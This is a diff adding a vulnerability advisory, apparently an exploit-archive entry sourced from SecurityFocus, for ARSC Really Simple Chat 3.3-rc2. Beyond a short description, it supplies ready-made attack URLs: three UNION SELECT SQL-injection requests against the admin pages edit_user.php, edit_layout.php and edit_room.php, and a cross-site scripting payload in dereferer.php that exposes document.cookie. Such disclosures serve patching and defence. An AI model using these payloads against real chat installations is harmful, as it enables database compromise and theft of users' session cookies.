@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/48083/info
+
+ARSC Really Simple Chat is prone to a cross-site scripting vulnerability and multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+ARSC Really Simple Chat 3.3-rc2 is vulnerable; other versions may also be affected. 
+
+SQL injection:
+
+http://www.example.com/base/admin/edit_user.php?arsc_user=-1%27%20union%20select%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15%20--%202
+http://www.example.com/base/admin/edit_layout.php?arsc_layout_id=-1%20union%20select%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+http://www.example.com/base/admin/edit_room.php?arsc_room=%27%20union%20select%201,2,version%28%29,4,5,6,7%20--%202
+
+Cross-site Scripting:
+
+http://www.example.com/base/dereferer.php?arsc_link=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
